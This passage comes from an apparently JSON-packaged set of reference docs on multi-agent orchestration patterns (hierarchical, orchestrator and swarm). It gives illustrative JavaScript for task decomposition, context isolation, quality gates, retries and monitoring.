**Quality at each level**\n- **Error detection rate**\n- **Escalation frequency**\n- **Final output quality**\n\n**Resources:**\n- **Agents per level**\n- **Context size per level**\n- **Memory usage**\n- **Computation time**\n\n### Example Monitoring\n\n```javascript\nclass HierarchicalMonitor {\n  trackExecution(task, results, levels) {\n    return {\n      task: task.id,\n      depth: levels.length,\n      qualityGates: levels.map(l => l.qualityScore),\n      synthesisPoints: levels.length,\n      escalationCount: this.countEscalations(results),\n      finalQuality: this.assessFinalQuality(results)\n    }\n  }\n}\n```\n\n## Conclusion\n\nThe Hierarchical Pattern excels when you need:\n- Quality control at each level\n- Progressive refinement\n- Complex task decomposition\n- Compliance and review processes\n\nRemember:\n- Match hierarchy depth to task complexity\n- Implement quality gates\n- Ensure context isolation\n- Balance quality vs. latency\n\nFor simple tasks, use Orchestrator or Swarm patterns instead.\n",
        "plugins/sys-agents/skills/orchestrating-agents/references/implementation-guide.md": "# Implementation Guide\n\n## Step-by-Step Implementation\n\n### Step 1: Assess Requirements\n\n**Questions to Answer:**\n1. Is this a single complex task or multiple independent tasks?\n2. Do tasks have clear sub-components?\n3. Is parallel execution beneficial?\n4. Are there quality requirements?\n5. How large is the task scope?\n\n**Decision Tree:**\n```\nIs task complex?  NO  Use single agent\n                   YES\nAre there independent subtasks?  NO  Use single agent\n                                  YES\nCan subtasks run in parallel?  NO  Use Orchestrator\n                               YES\nIs quality control critical?  NO  Use Swarm\n                             YES\nUse Hierarchical\n```\n\n### Step 2: Choose Pattern\n\n**Based on Requirements:**\n\n**Orchestrator:**\n- Single complex task\n- Different expertise areas\n- Centralized coordination needed\n- Quality at synthesis point\n\n**Swarm:**\n- Multiple independent tasks\n- Parallel speedup needed\n- Different perspectives helpful\n- Fault tolerance required\n\n**Hierarchical:**\n- Quality control at each level\n- Multi-level decomposition\n- Compliance requirements\n- Progressive refinement\n\n### Step 3: Design Architecture\n\n#### For Orchestrator:\n\n```javascript\n// Define agent types needed\nconst agentTypes = {\n  'research': ResearchAgent,\n  'analysis': AnalysisAgent,\n  'writing': WritingAgent,\n  'review': ReviewAgent\n}\n\n// Define task decomposition\nfunction decompose(task) {\n  return [\n    { type: 'research', output: 'research_data.json' },\n    { type: 'analysis', output: 'analysis_report.md' },\n    { type: 'writing', output: 'final_report.md' },\n    { type: 'review', output: 'review_feedback.md' }\n  ]\n}\n\n// Define synthesis strategy\nfunction synthesize(results) {\n  // Combine all results into final output\n  return finalReport\n}\n```\n\n#### For Swarm:\n\n```javascript\n// Define swarm configuration\nconst swarmConfig = {\n  agentType: 'ResearchAgent',\n  agentCount: 10,\n  redundancyLevel: 3, // For critical tasks\n  diversity: 'multiple_perspectives'\n}\n\n// Define aggregation strategy\nfunction aggregate(results) {\n  // Combine parallel results\n  // Handle conflicts\n  // Calculate consensus\n  return combinedResults\n}\n```\n\n#### For Hierarchical:\n\n```javascript\n// Define hierarchy\nconst hierarchyConfig = {\n  depth: 3,\n  width: 3, // agents per level\n  qualityGates: {\n    level1: { threshold: 0.95 },\n    level2: { threshold: 0.90 },\n    level3: { threshold: 0.85 }\n  }\n}\n```\n\n### Step 4: Implement Interfaces\n\n#### Task Interface\n\n```typescript\ninterface Task {\n  id: string\n  description: string\n  context: TaskContext\n  constraints: TaskConstraints\n  resources: TaskResources\n  outputFormat: string\n}\n\ninterface TaskContext {\n  relevantFiles: string[]\n  data: any\n  previousResults?: any\n}\n\ninterface TaskConstraints {\n  timeLimit?: number\n  qualityThreshold?: number\n  maxRetries?: number\n}\n```\n\n#### Result Interface\n\n```typescript\ninterface Result {\n  success: boolean\n  output: any\n  metadata: ResultMetadata\n  error?: Error\n}\n\ninterface ResultMetadata {\n  duration: number\n  qualityScore: number\n  agentType: string\n  contextSize: number\n}\n```\n\n#### Agent Interface\n\n```typescript\ninterface Agent {\n  execute(task: Task, context: Context): Promise<Result>\n  validate(result: Result): boolean\n  getCapabilities(): string[]\n  getResourceRequirements(): ResourceRequirements\n}\n```\n\n### Step 5: Implement Context Isolation\n\n#### Context Extraction\n\n```javascript\nclass ContextExtractor {\n  extract(task, subtask) {\n    return {\n      task: subtask.description,\n      data: this.filterData(task.data, subtask.relevantTo),\n      constraints: subtask.constraints,\n      outputFormat: subtask.outputFormat,\n      // Only include necessary information\n    }\n  }\n\n  filterData(allData, relevantCriteria) {\n    return allData.filter(item =>\n      relevantCriteria.some(criteria => item.matches(criteria))\n    )\n  }\n}\n```\n\n#### Context Management\n\n```javascript\nclass ContextManager {\n  constructor(maxSize = 50000) {\n    this.maxSize = maxSize\n    this.contexts = new Map()\n  }\n\n  setContext(taskId, context) {\n    // Compress context if needed\n    const compressed = this.compress(context)\n\n    if (compressed.size > this.maxSize) {\n      throw new Error('Context too large')\n    }\n\n    this.contexts.set(taskId, compressed)\n  }\n\n  getContext(taskId) {\n    return this.contexts.get(taskId)\n  }\n\n  compress(context) {\n    // Remove irrelevant details\n    // Summarize large texts\n    // Compress data structures\n    return compressedContext\n  }\n}\n```\n\n### Step 6: Implement Communication\n\n#### Message Format\n\n```javascript\nclass AgentMessage {\n  constructor(task, context) {\n    this.message = {\n      task: task.description,\n      context: context,\n      instructions: task.instructions,\n      outputFormat: task.outputFormat,\n      resources: task.resources\n    }\n  }\n\n  toJSON() {\n    return JSON.stringify(this.message)\n  }\n}\n```\n\n#### Result Format\n\n```javascript\nclass AgentResult {\n  constructor(output, metadata) {\n    this.result = {\n      success: true,\n      output: output,\n      metadata: metadata\n    }\n  }\n\n  toJSON() {\n    return JSON.stringify(this.result)\n  }\n}\n```\n\n### Step 7: Implement Quality Gates\n\n#### Quality Assessment\n\n```javascript\nclass QualityGate {\n  assess(result, threshold) {\n    const metrics = {\n      completeness: this.checkCompleteness(result),\n      accuracy: this.checkAccuracy(result),\n      consistency: this.checkConsistency(result),\n      format: this.checkFormat(result)\n    }\n\n    const overall = this.calculateOverall(metrics)\n\n    return {\n      passed: overall >= threshold,\n      score: overall,\n      metrics: metrics\n    }\n  }\n\n  checkCompleteness(result) {\n    // Check if all required sections present\n    // Verify all data points included\n    return 0.0 to 1.0\n  }\n\n  checkAccuracy(result) {\n    // Validate against known facts\n    // Check calculations\n    // Verify data consistency\n    return 0.0 to 1.0\n  }\n\n  checkConsistency(result) {\n    // Internal consistency\n    // Cross-reference data\n    // Check for contradictions\n    return 0.0 to 1.0\n  }\n}\n```\n\n### Step 8: Implement Error Handling\n\n#### Error Types\n\n```javascript\nclass AgentError extends Error {\n  constructor(type, message, task, agent) {\n    super(message)\n    this.type = type\n    this.task = task\n    this.agent = agent\n    this.timestamp = Date.now()\n  }\n}\n\nconst ErrorTypes = {\n  AGENT_FAILURE: 'agent_failure',\n  COORDINATION_FAILURE: 'coordination_failure',\n  QUALITY_FAILURE: 'quality_failure',\n  TIMEOUT: 'timeout',\n  RESOURCE_EXHAUSTION: 'resource_exhaustion'\n}\n```\n\n#### Retry Strategy\n\n```javascript\nclass RetryManager {\n  async executeWithRetry(task, agent, maxRetries = 3) {\n    for (let attempt = 1; attempt <= maxRetries; attempt++) {\n      try {\n        const result = await agent.execute(task)\n\n        if (result.quality >= task.qualityThreshold) {\n          return result\n        }\n\n        throw new QualityError('Below threshold', result)\n      } catch (error) {\n        if (attempt === maxRetries) {\n          throw error\n        }\n\n        // Exponential backoff\n        await this.delay(attempt * 1000)\n\n        // Adjust task or agent for retry\n        task = this.adjustTaskForRetry(task, error)\n      }\n    }\n  }\n\n  adjustTaskForRetry(task, error) {\n    // Simplify task\n    // Reduce scope\n    // Change approach\n    return adjustedTask\n  }\n}\n```\n\n### Step 9: Implement Monitoring\n\n#### Metrics Collection\n\n```javascript\nclass MetricsCollector {\n  trackTask(taskId, startTime) {\n    const metrics = {\n      taskId: taskId,\n      startTime: startTime,\n      events: []\n    }\n\n    return metrics\n  }\n\n  recordEvent(metrics, event) {\n    metrics.events.push({\n      timestamp: Date.now(),\n      type: event.type,\n      data: event.data\n    })\n  }\n\n  finalize(metrics, endTime) {\n    return {\n      taskId: metrics.taskId,\n      duration: endTime - metrics.startTime,\n      events: metrics.events,\n      agentCount: this.countAgents(metrics.events),\n      qualityScore: this.calculateQuality(metrics.events)\n    }\n  }\n}\n```\n\n### Step 10: Testing Strategy\n\n#### Unit Tests\n\n```javascript\ndescribe('Agent Orchestration', () => {\n  test('orchestrator decomposes task correctly', () => {\n    const orchestrator = new Orchestrator()\n    const task = { description: 'complex_task' }\n\n    const subtasks = orchestrator.decompose(task)\n\n    expect(subtasks.length).toBeGreaterThan(0)\n    expect(subtasks.every(st => st.type)).toBe(true)\n  })\n\n  test('context isolation works', () => {\n    const extractor = new ContextExtractor()\n    const fullContext = { data: [...], history: [...] }\n    const subtask = { relevantTo: ['data.point1'] }\n\n    const isolated = extractor.extract(fullContext, subtask)\n\n    expect(isolated.data).toContain('data.point1')\n    expect(isolated.history).toBeUndefined()\n  })\n})\n```\n\n#### Integration Tests\n\n```javascript\ndescribe('Multi-Agent Integration', () => {\n  test('orchestrator produces correct output', async () => {\n    const orchestrator = new Orchestrator({\n      agents: {\n        research: new ResearchAgent(),\n        analysis: new AnalysisAgent(),\n        writing: new WritingAgent()\n      }\n    })\n\n    const task = { description: 'research_report' }\n    const result = await orchestrator.execute(task)\n\n    expect(result.success).toBe(true)\n    expect(result.output).toContain('research')\n    expect(result.output).toContain('analysis')\n  })\n\n  test('swarm produces consensus', async () => {\n    const swarm = new Swarm({\n      agentCount: 5,\n      aggregation: 'majority_vote'\n    })\n\n    const task = { description: 'review_code' }\n    const results = await swarm.execute(task)\n\n    expect(results.length).toBe(5)\n    expect(results.consistent).toBe(true)\n  })\n})\n```\n\n### Step 11: Deployment\n\n#### Configuration\n\n```javascript\nconst config = {\n  pattern: 'orchestrator', // orchestrator, swarm, hierarchical\n\n  orchestrator: {\n    agents: {\n      research: { class: 'ResearchAgent', count: 1 },\n      analysis: { class: 'AnalysisAgent', count: 1 },\n      writing: { class: 'WritingAgent', count: 1 }\n    }\n  },\n\n  swarm: {\n    agentCount: 10,\n    redundancy: 3,\n    timeout: 300000\n  },\n\n  hierarchical: {\n    depth: 3,\n    width: 3,\n    qualityThreshold: 0.9\n  },\n\n  resources: {\n    maxConcurrentTasks: 5,\n    memoryLimit: '2GB',\n    timeout: 600000\n  }\n}\n```\n\n#### Production Considerations\n\n```javascript\nclass ProductionOrchestrator {\n  constructor(config) {\n    this.config = config\n    this.loadBalancer = new LoadBalancer()\n    this.circuitBreaker = new CircuitBreaker()\n    this.rateLimiter = new RateLimiter()\n  }\n\n  async execute(task) {\n    // Check rate limits\n    if (!this.rateLimiter.allow(task)) {\n      throw new RateLimitError()\n    }\n\n    // Check circuit breaker\n    if (this.circuitBreaker.isOpen()) {\n      throw new CircuitBreakerError()\n    }\n\n    try {\n      // Execute with monitoring\n      const result = await this.executeWithMetrics(task)\n\n      this.circuitBreaker.recordSuccess()\n      return result\n    } catch (error) {\n      this.circuitBreaker.recordFailure()\n      throw error\n    }\n  }\n}\n```\n\n## Common Patterns\n\n### Pattern 1: Progressive Complexity\n\n```javascript\n// Start simple, add complexity\nclass SmartOrchestrator extends Orchestrator {\n  async execute(task) {\n    // Try simple approach first\n    try {\n      return await this.simpleExecute(task)\n    } catch (error) {\n      // If simple fails, use complex approach\n      return await this.complexExecute(task)\n    }\n  }\n}\n```\n\n### Pattern 2: Adaptive Pattern Selection\n\n```javascript\nclass AdaptiveOrchestrator {\n  async execute(task) {\n    const pattern = this.selectPattern(task)\n\n    switch (pattern) {\n      case 'orchestrator':\n        return this.orchestratorExecute(task)\n      case 'swarm':\n        return this.swarmExecute(task)\n      case 'hierarchical':\n        return this.hierarchicalExecute(task)\n    }\n  }\n\n  selectPattern(task) {\n    if (task.parallelizable) {\n      return 'swarm'\n    } else if (task.complexity > 0.8) {\n      return 'hierarchical'\n    } else {\n      return 'orchestrator'\n    }\n  }\n}\n```\n\n### Pattern 3: Caching\n\n```javascript\nclass CachedOrchestrator extends Orchestrator {\n  constructor(config) {\n    super(config)\n    this.cache = new LRUCache({ max: 100 })\n  }\n\n  async execute(task) {\n    const cacheKey = this.getCacheKey(task)\n\n    if (this.cache.has(cacheKey)) {\n      return this.cache.get(cacheKey)\n    }\n\n    const result = await super.execute(task)\n    this.cache.set(cacheKey, result)\n\n    return result\n  }\n}\n```\n\n## Performance Optimization\n\n### 1. Parallel Execution\n\n```javascript\nclass ParallelOrchestrator extends Orchestrator {\n  async executeSubtasks(subtasks) {\n    // Run independent subtasks in parallel\n    const independent = subtasks.filter(st => !st.dependsOn)\n    const dependent = subtasks.filter(st => st.dependsOn)\n\n    // Execute independent in parallel\n    const independentResults = await Promise.all(\n      independent.map(st => this.executeSubtask(st))\n    )\n\n    // Execute dependent sequentially\n    const dependentResults = []\n    for (const st of dependent) {\n      const result = await this.executeSubtask(st)\n      dependentResults.push(result)\n    }\n\n    return [...independentResults, ...dependentResults]\n  }\n}\n```\n\n### 2. Resource Pooling\n\n```javascript\nclass AgentPool {\n  constructor(agentClass, size) {\n    this.available = Array(size).fill(0).map(() => new agentClass())\n    this.inUse = new Set()\n  }\n\n  async acquire() {\n    while (this.available.length === 0) {\n      await this.waitForAgent()\n    }\n\n    const agent = this.available.pop()\n    this.inUse.add(agent)\n\n    return {\n      agent,\n      release: () => this.release(agent)\n    }\n  }\n\n  release(agent) {\n    this.inUse.delete(agent)\n    this.available.push(agent)\n  }\n}\n```\n\n### 3. Lazy Loading\n\n```javascript\nclass LazyAgentFactory {\n  constructor() {\n    this.cache = new Map()\n  }\n\n  getAgent(type) {\n    if (!this.cache.has(type)) {\n      this.cache.set(type, this.createAgent(type))\n    }\n\n    return this.cache.get(type)\n  }\n\n  createAgent(type) {\n    // Load agent class only when needed\n    const AgentClass = require(`./agents/${type}Agent`)\n    return new AgentClass()\n  }\n}\n```\n\n## Debugging Tips\n\n### 1. Logging\n\n```javascript\nclass DebugOrchestrator extends Orchestrator {\n  async execute(task) {\n    console.log(`[Orchestrator] Starting task: ${task.id}`)\n\n    const subtasks = this.decompose(task)\n    console.log(`[Orchestrator] Decomposed into ${subtasks.length} subtasks`)\n\n    const results = await Promise.all(\n      subtasks.map(st => this.executeWithLogging(st))\n    )\n\n    const final = this.synthesize(results)\n    console.log(`[Orchestrator] Completed task: ${task.id}`)\n\n    return final\n  }\n\n  async executeWithLogging(subtask) {\n    console.log(`[Agent] Executing: ${subtask.type}`)\n    const start = Date.now()\n\n    try {\n      const result = await this.executeSubtask(subtask)\n      console.log(`[Agent] Completed: ${subtask.type} in ${Date.now() - start}ms`)\n      return result\n    } catch (error) {\n      console.log(`[Agent] Failed: ${subtask.type} - ${error.message}`)\n      throw error\n    }\n  }\n}\n```\n\n### 2. Visualization\n\n```javascript\nclass VisualizableOrchestrator extends Orchestrator {\n  visualizeExecution(task) {\n    const visualization = {\n      task: task.id,\n      subtasks: this.decompose(task).map(st => ({\n        type: st.type,\n        status: 'pending',\n        startTime: null,\n        endTime: null\n      }))\n    }\n\n    return visualization\n  }\n\n  updateVisualization(visualization, subtask, status) {\n    const entry = visualization.subtasks.find(st => st.type === subtask.type)\n    if (entry) {\n      entry.status = status\n      if (status === 'running') {\n        entry.startTime = Date.now()\n      } else if (status === 'completed' || status === 'failed') {\n        entry.endTime = Date.now()\n      }\n    }\n  }\n}\n```\n\n## Conclusion\n\nImplementation checklist:\n- [ ] Assess requirements\n- [ ] Choose pattern\n- [ ] Design architecture\n- [ ] Define interfaces\n- [ ] Implement context isolation\n- [ ] Implement communication\n- [ ] Add quality gates\n- [ ] Handle errors\n- [ ] Add monitoring\n- [ ] Write tests\n- [ ] Configure deployment\n- [ ] Optimize performance\n\nRemember: Start simple, add complexity incrementally, and always test thoroughly.\n",
        "plugins/sys-agents/skills/orchestrating-agents/references/orchestrator-pattern.md": "# Orchestrator Pattern\n\n## Overview\n\nThe **Orchestrator Pattern** uses a central planning agent that delegates specialized tasks to executor agents, maintaining global context while sub-agents operate with isolated, focused contexts.\n\n## Pattern Definition\n\n```\nMain Agent (Global Context)  Specialized Agents (Focused Contexts)  Synthesis\n```\n\nThe orchestrator maintains the big picture, decomposes tasks, delegates to specialists, and synthesizes results.\n\n## When to Use\n\n**Ideal for:**\n- Single complex task requiring different expertise areas\n- Need to prevent main agent context saturation\n- Tasks with clear sub-components\n- Centralized planning with distributed execution\n- Quality control at synthesis point\n\n**Not suitable for:**\n- Simple, linear tasks\n- When parallel execution isn't beneficial\n- Small scope tasks\n- When coordination overhead exceeds benefits\n\n## Architecture\n\n### Components\n\n**1. Orchestrator Agent**\n- Maintains global context\n- Plans task decomposition\n- Delegates to specialized agents\n- Synthesizes results\n- Handles errors and retries\n\n**2. Specialized Executor Agents**\n- Focused on specific task type\n- Isolated context (minimal shared state)\n- Specialized expertise\n- Return structured results\n\n**3. Communication Layer**\n- Structured message passing\n- Result aggregation\n- Error propagation\n- Quality checks\n\n## Implementation\n\n### Core Implementation\n\n```javascript\nclass Orchestrator {\n  async execute(task) {\n    // Step 1: Decompose task\n    const subtasks = this.decompose(task)\n\n    // Step 2: Execute subtasks in parallel\n    const results = await Promise.all(\n      subtasks.map(subtask => this.executeSubtask(subtask))\n    )\n\n    // Step 3: Synthesize results\n    return this.synthesize(results)\n  }\n\n  async executeSubtask(subtask) {\n    // Get specialized agent\n    const agent = this.getAgent(subtask.type)\n\n    // Extract minimal context\n    const minimalContext = this.getMinimalContext(subtask)\n\n    // Execute with isolated context\n    return agent.execute(subtask, minimalContext)\n  }\n\n  decompose(task) {\n    // Task decomposition logic\n    return [\n      { type: 'research', context: {...} },\n      { type: 'analysis', context: {...} },\n      { type: 'synthesis', context: {...} }\n    ]\n  }\n\n  synthesize(results) {\n    // Combine results into final output\n    return results.reduce((acc, result) => {\n      return { ...acc, ...result }\n    }, {})\n  }\n}\n```\n\n### Agent Selection\n\n```javascript\nclass AgentFactory {\n  private agents = {\n    'research': new ResearchAgent(),\n    'analysis': new AnalysisAgent(),\n    'writing': new WritingAgent(),\n    'review': new ReviewAgent()\n  }\n\n  getAgent(type) {\n    if (!this.agents[type]) {\n      throw new Error(`Unknown agent type: ${type}`)\n    }\n    return this.agents[type]\n  }\n}\n```\n\n### Context Isolation\n\n```javascript\nclass ContextExtractor {\n  extractMinimalContext(task, subtask) {\n    return {\n      task: subtask.description,\n      constraints: subtask.constraints,\n      resources: subtask.resources,\n      outputFormat: subtask.outputFormat,\n      // Only include what's absolutely necessary\n      relevantData: this.filterRelevantData(task.data, subtask)\n    }\n  }\n\n  filterRelevantData(allData, subtask) {\n    // Return only data relevant to this specific subtask\n    return allData.filter(item =>\n      subtask.relevantTo.includes(item.id)\n    )\n  }\n}\n```\n\n## Example Use Cases\n\n### Use Case 1: Research Report\n\n**Task:** \"Create comprehensive market analysis report\"\n\n**Subtasks:**\n1. **Research Agent** - Market data collection\n2. **Analysis Agent** - Trend analysis\n3. **Writing Agent** - Report composition\n4. **Review Agent** - Quality check\n\n**Orchestration:**\n```\nMain Agent\n   Research Agent (market data, isolated context)\n   Analysis Agent (trends, isolated context)\n   Writing Agent (compose report, isolated context)\n   Review Agent (quality check, isolated context)\n   Synthesize (final report)\n```\n\n### Use Case 2: Software Development\n\n**Task:** \"Implement new feature\"\n\n**Subtasks:**\n1. **Architecture Agent** - Design system\n2. **Code Agent** - Implementation\n3. **Test Agent** - Unit tests\n4. **Documentation Agent** - API docs\n5. **Review Agent** - Code review\n\n### Use Case 3: Data Analysis\n\n**Task:** \"Analyze customer churn\"\n\n**Subtasks:**\n1. **Data Collection Agent** - Gather data\n2. **Cleaning Agent** - Process data\n3. **Analysis Agent** - Statistical analysis\n4. **Visualization Agent** - Create charts\n5. **Reporting Agent** - Generate insights\n\n## Benefits\n\n**Clear Task Decomposition**\n- Complex tasks broken into manageable pieces\n- Each agent focuses on one area\n- Easier to understand and maintain\n\n**Global View Maintained**\n- Orchestrator sees entire task\n- Can make global decisions\n- Coordinates effectively\n\n**Specialized Expertise**\n- Each agent is expert in its domain\n- Higher quality output\n- Better problem-solving\n\n**Context Isolation**\n- Prevents context saturation\n- Agents have focused context\n- Scalable to large tasks\n\n## Limitations\n\n**Single Point of Coordination**\n- Orchestrator can become bottleneck\n- Failure affects entire task\n- Must handle orchestrator reliability\n\n**Coordination Overhead**\n- Communication between agents\n- Result merging complexity\n- Timing and sequencing\n\n**Complex Planning Required**\n- Must decompose tasks well\n- Requires understanding of problem space\n- Planning effort significant\n\n**Error Propagation**\n- Errors must be handled at orchestrator\n- Retry logic complex\n- Partial failure management\n\n## Best Practices\n\n### 1. Clear Task Decomposition\n\n**Do:**\n- Break task into independent subtasks\n- Minimize dependencies between subtasks\n- Define clear interfaces\n- Specify expected outputs\n\n**Example:**\n```javascript\n// Good: Independent subtasks\nconst subtasks = [\n  { type: 'research', output: 'market_data.json' },\n  { type: 'analysis', output: 'trend_analysis.md' },\n  { type: 'writing', output: 'final_report.md' }\n]\n\n// Avoid: Tightly coupled subtasks\nconst subtasks = [\n  { type: 'analysis', dependsOn: 'research' },\n  { type: 'writing', dependsOn: ['analysis', 'research'] }\n]\n```\n\n### 2. Minimal Context Sharing\n\n**Do:**\n- Pass only necessary data\n- Use structured formats\n- Avoid conversation history\n- Document what's needed\n\n**Example:**\n```javascript\n// Good: Minimal context\nconst context = {\n  task: \"Analyze Q4 revenue trends\",\n  data: revenueData.slice(0, 100), // Sample, not all\n  outputFormat: \"markdown_table\",\n  constraints: \"Focus on growth > 20%\"\n}\n\n// Bad: Excessive context\nconst context = {\n  task: \"Analyze Q4 revenue trends\",\n  entireConversationHistory: [...],\n  allPreviousAnalyses: [...],\n  allAvailableData: [...],\n  allPossibleContexts: [...]\n}\n```\n\n### 3. Structured Results\n\n**Do:**\n- Define result format\n- Use consistent structure\n- Include metadata\n- Validate outputs\n\n**Example:**\n```javascript\n// Good: Structured result\n{\n  \"success\": true,\n  \"output\": {\n    \"type\": \"analysis\",\n    \"summary\": \"Revenue grew 23% in Q4\",\n    \"details\": [...],\n    \"charts\": [\"chart1.png\", \"chart2.png\"]\n  },\n  \"metadata\": {\n    \"duration\": 120,\n    \"quality\": 0.95,\n    \"confidence\": 0.98\n  }\n}\n```\n\n### 4. Error Handling\n\n**Do:**\n- Implement retry logic\n- Handle partial failures\n- Escalate appropriately\n- Log errors clearly\n\n**Example:**\n```javascript\nasync executeSubtask(subtask, maxRetries = 3) {\n  for (let attempt = 1; attempt <= maxRetries; attempt++) {\n    try {\n      return await agent.execute(subtask)\n    } catch (error) {\n      if (attempt === maxRetries) {\n        // Final attempt failed\n        return {\n          success: false,\n          error: error.message,\n          attempt: attempt\n        }\n      }\n\n      // Wait before retry\n      await this.delay(attempt * 1000)\n    }\n  }\n}\n```\n\n### 5. Quality Gates\n\n**Do:**\n- Check results before synthesis\n- Validate outputs\n- Implement quality metrics\n- Reject poor quality results\n\n## Anti-Patterns to Avoid\n\n### Anti-Pattern 1: Too Many Agents\n\n**Problem:** Creating too many specialized agents\n```javascript\n// Bad: Over-decomposition\nconst subtasks = [\n  { type: 'research_web', agent: 'webResearchAgent' },\n  { type: 'research_db', agent: 'dbResearchAgent' },\n  { type: 'research_api', agent: 'apiResearchAgent' },\n  { type: 'research_pdf', agent: 'pdfResearchAgent' },\n  { type: 'research_csv', agent: 'csvResearchAgent' }\n]\n```\n\n**Solution:** Consolidate related tasks\n```javascript\n// Good: Appropriate decomposition\nconst subtasks = [\n  { type: 'research', agent: 'researchAgent' },\n  { type: 'analysis', agent: 'analysisAgent' }\n]\n```\n\n### Anti-Pattern 2: Context Leakage\n\n**Problem:** Agents share too much context\n```javascript\n// Bad: Full context sharing\nagent.execute(subtask, fullTaskContext)\n```\n\n**Solution:** Minimal context\n```javascript\n// Good: Isolated context\nagent.execute(subtask, minimalContextForSubtask)\n```\n\n### Anti-Pattern 3: Unstructured Results\n\n**Problem:** Inconsistent result formats\n```javascript\n// Bad: Inconsistent\nresult1 = \"Analysis complete\"\nresult2 = { data: [...], status: \"done\" }\nresult3 = true\n```\n\n**Solution:** Consistent structure\n```javascript\n// Good: Structured\nresult = {\n  success: true,\n  output: {...},\n  metadata: {...}\n}\n```\n\n## Monitoring and Metrics\n\n### Key Metrics\n\n**Performance:**\n- **Total execution time**\n- **Per-agent execution time**\n- **Coordination overhead**\n- **Parallelization efficiency**\n\n**Quality:**\n- **Result accuracy**\n- **Agent success rate**\n- **Retry frequency**\n- **Synthesis quality**\n\n**Resource Usage:**\n- **Memory per agent**\n- **Context size**\n- **Communication overhead**\n\n### Example Monitoring\n\n```javascript\nclass OrchestratorMonitor {\n  trackExecution(task, subtasks, results) {\n    return {\n      task: task.id,\n      totalDuration: Date.now() - startTime,\n      subtasks: subtasks.map((st, i) => ({\n        type: st.type,\n        duration: results[i].duration,\n        success: results[i].success\n      })),\n      coordinationOverhead: this.calculateOverhead(),\n      qualityScore: this.calculateQuality(results)\n    }\n  }\n}\n```\n\n## Conclusion\n\nThe Orchestrator Pattern is ideal when you need:\n- Centralized planning with distributed execution\n- Different expertise areas\n- Clear task decomposition\n- Quality control at synthesis point\n\nRemember:\n- Keep orchestrator lightweight\n- Minimize context sharing\n- Use structured communication\n- Implement robust error handling\n\nThe orchestrator should focus on coordination, not execution.\n",
        "plugins/sys-agents/skills/orchestrating-agents/references/swarm-pattern.md": "# Swarm Pattern\n\n## Overview\n\nThe **Swarm Pattern** uses multiple agents working in parallel on identical or similar tasks, each with isolated context, combining results at the end.\n\n## Pattern Definition\n\n```\nTask  N Agents (Parallel Execution)  Result Aggregation\n```\n\nMultiple agents execute simultaneously, providing parallelism, redundancy, and diverse perspectives.\n\n## When to Use\n\n**Ideal for:**\n- Multiple independent tasks of same type\n- Need for parallel speedup\n- Different perspectives on same problem\n- Large-scale data processing\n- Redundancy and fault tolerance\n- Brainstorming and ideation\n\n**Not suitable for:**\n- Sequential, dependent tasks\n- Single, focused task\n- When result coordination is complex\n- Limited computational resources\n\n## Architecture\n\n### Components\n\n**1. Swarm Coordinator**\n- Distributes tasks to agents\n- Monitors progress\n- Handles failures\n- Aggregates results\n\n**2. Swarm Agents**\n- Identical or similar agents\n- Parallel execution\n- Isolated contexts\n- Independent results\n\n**3. Result Aggregator**\n- Combines results\n- Handles conflicts\n- Resolves disagreements\n- Produces final output\n\n## Implementation\n\n### Basic Implementation\n\n```javascript\nclass Swarm {\n  async execute(task, agentCount = 5) {\n    // Create agents\n    const agents = Array(agentCount).fill(0).map(() => new Agent())\n\n    // Execute all agents in parallel\n    const results = await Promise.all(\n      agents.map(agent => this.executeAgent(agent, task))\n    )\n\n    // Aggregate results\n    return this.aggregateResults(results)\n  }\n\n  async executeAgent(agent, task) {\n    try {\n      return await agent.execute(task)\n    } catch (error) {\n      return {\n        success: false,\n        error: error.message,\n        agentId: agent.id\n      }\n    }\n  }\n}\n```\n\n### Redundant Execution\n\n```javascript\nclass RedundantSwarm extends Swarm {\n  async execute(task, redundancy = 3) {\n    // Execute same task multiple times\n    const results = await Promise.all(\n      Array(redundancy).fill(0).map(() => this.executeOnce(task))\n    )\n\n    // Aggregate redundant results\n    return this.consensus(results)\n  }\n\n  async executeOnce(task) {\n    const agent = new Agent()\n    return agent.execute(task)\n  }\n\n  consensus(results) {\n    // Find agreement among results\n    const validResults = results.filter(r => r.success)\n\n    if (validResults.length === 0) {\n      throw new Error(\"All agents failed\")\n    }\n\n    // Use majority vote or average\n    if (this.isNumerical(validResults[0].output)) {\n      return this.average(validResults.map(r => r.output))\n    } else {\n      return this.majorityVote(validResults.map(r => r.output))\n    }\n  }\n}\n```\n\n### Diverse Perspectives\n\n```javascript\nclass DiverseSwarm extends Swarm {\n  constructor() {\n    super()\n    this.agentTypes = [\n      'analytical',\n      'creative',\n      'technical',\n      'business',\n      'risk'\n    ]\n  }\n\n  async execute(task) {\n    // Each agent gets task with different angle\n    const agents = this.agentTypes.map(type => ({\n      type,\n      agent: this.createAgent(type)\n    }))\n\n    const results = await Promise.all(\n      agents.map(({ type, agent }) =>\n        this.executeAgent(agent, this.biasTask(task, type))\n      )\n    )\n\n    return this.combinePerspectives(results)\n  }\n\n  biasTask(task, perspective) {\n    const biases = {\n      'analytical': 'Focus on data and metrics',\n      'creative': 'Think outside the box',\n      'technical': 'Consider technical feasibility',\n      'business': 'Prioritize business impact',\n      'risk': 'Identify potential risks'\n    }\n\n    return {\n      ...task,\n      instructions: `${task.instructions}\\nPerspective: ${biases[perspective]}`\n    }\n  }\n}\n```\n\n## Example Use Cases\n\n### Use Case 1: Code Review\n\n**Task:** \"Review this code for bugs\"\n\n**Swarm:** 5 code reviewer agents\n**Benefit:** Different agents catch different types of bugs\n\n**Execution:**\n```\nCode Review Task\n   Reviewer Agent 1 (security focus)\n   Reviewer Agent 2 (performance focus)\n   Reviewer Agent 3 (style focus)\n   Reviewer Agent 4 (logic focus)\n   Reviewer Agent 5 (architecture focus)\n   Aggregate (comprehensive review)\n```\n\n### Use Case 2: Market Research\n\n**Task:** \"Research competitive landscape\"\n\n**Swarm:** 10 research agents\n**Benefit:** Parallel data collection, diverse sources\n\n**Execution:**\n```\nResearch Task\n   Research Agent 1 (public filings)\n   Research Agent 2 (customer reviews)\n   Research Agent 3 (industry reports)\n   Research Agent 4 (social media)\n   Research Agent 5 (news articles)\n   Research Agent 6 (technical blogs)\n   Research Agent 7 (expert interviews)\n   Research Agent 8 (patent filings)\n   Research Agent 9 (funding data)\n   Research Agent 10 (product demos)\n   Aggregate (comprehensive landscape)\n```\n\n### Use Case 3: Data Processing\n\n**Task:** \"Process 1M customer records\"\n\n**Swarm:** 100 processing agents\n**Benefit:** Parallel processing, faster completion\n\n**Execution:**\n```\nData Processing Task (1M records)\n   Chunk 1: Agent 1 (records 1-10K)\n   Chunk 2: Agent 